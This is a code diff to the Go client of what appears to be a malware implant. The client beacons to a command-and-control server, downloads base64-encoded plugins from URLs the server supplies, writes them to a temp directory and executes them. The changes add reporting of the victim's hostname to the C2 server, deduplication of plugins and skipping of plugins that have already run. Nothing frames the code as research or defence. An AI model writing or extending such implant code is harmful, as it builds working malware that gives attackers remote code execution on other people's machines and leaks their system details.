@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"net/http"
 	"net/url"
 	"os"
@@ -17,7 +18,7 @@ import (
 var PrintDebugMessages bool
 
 type ImplantPlugin struct {
-	PluginId     string //GUID
+	PluginId     string
 	PluginName   string
 	PluginFile   string
 	PluginUrl    string
@@ -48,12 +49,32 @@ func CheckError(err error) {
 	}
 }
 
+func RandomString(n int) string {
+	var letters = []rune("abcdefghijklmnopqrstuvwxyz0123456789")
+
+	s := make([]rune, n)
+	for i := range s {
+		s[i] = letters[rand.Intn(len(letters))]
+	}
+	return string(s)
+}
+
+func PluginInList(testStr string, plugins []ImplantPlugin) bool {
+	for _, plugin := range plugins {
+		if plugin.PluginName == testStr {
+			return true
+		}
+	}
+	return false
+}
+
 func (implantClient *ImplantClient) DownloadPlugins() error {
 	for idx, pluginToDownload := range implantClient.PluginsToRun {
 		DebugPrinter("Downloading from " + pluginToDownload.PluginUrl)
 		res, err := http.PostForm(pluginToDownload.PluginUrl, url.Values{
-			"pluginId": {pluginToDownload.PluginId},
+			"pluginName": {pluginToDownload.PluginName},
 		})
+		CheckError(err)
 		defer res.Body.Close()
 		pluginBase64, err := ioutil.ReadAll(res.Body)
 		CheckError(err)
@@ -80,6 +101,10 @@ func (implantClient *ImplantClient) WritePluginToTempDir(base64Plugin string) (s
 
 func (implantClient *ImplantClient) ExecutePlugins() error {
 	for idx, pluginToRun := range implantClient.PluginsToRun {
+		DebugPrinter("PLUGIN LENGTH " + strconv.Itoa(len(pluginToRun.PluginResult)))
+		if len(pluginToRun.PluginResult) > 0 {
+			continue
+		}
 		DebugPrinter("EXECUTING " + pluginToRun.PluginFile)
 		plugin, err := plugin.Open(pluginToRun.PluginFile)
 		if err != nil {
@@ -111,8 +136,11 @@ func (implantClient *ImplantClient) ExecutePlugins() error {
 
 func (implantClient *ImplantClient) HeartBeat() error {
 	//Call C2 server get json list of plugins
+	hostname, err := os.Hostname()
+	CheckError(err)
 	res, err := http.PostForm(implantClient.Url, url.Values{
-		"client_password": {implantClient.C2Pass}})
+		"client_password": {implantClient.C2Pass},
+		"hostname":        {hostname}})
 	CheckError(err)
 	//Update Plugin list
 	defer res.Body.Close()
@@ -126,6 +154,9 @@ func (implantClient *ImplantClient) HeartBeat() error {
 			PluginId:   pluginFromC2.PluginID,
 			PluginName: pluginFromC2.PluginName,
 			PluginUrl:  pluginFromC2.PluginURL,
+		}
+		if PluginInList(pluginToAdd.PluginName, implantClient.PluginsToRun) {
+			continue
 		}
 		DebugPrinter("PLUGIN " + pluginToAdd.PluginUrl)
 		DebugPrinter("LEN BEFORE: " + strconv.Itoa(len(implantClient.PluginsToRun)))
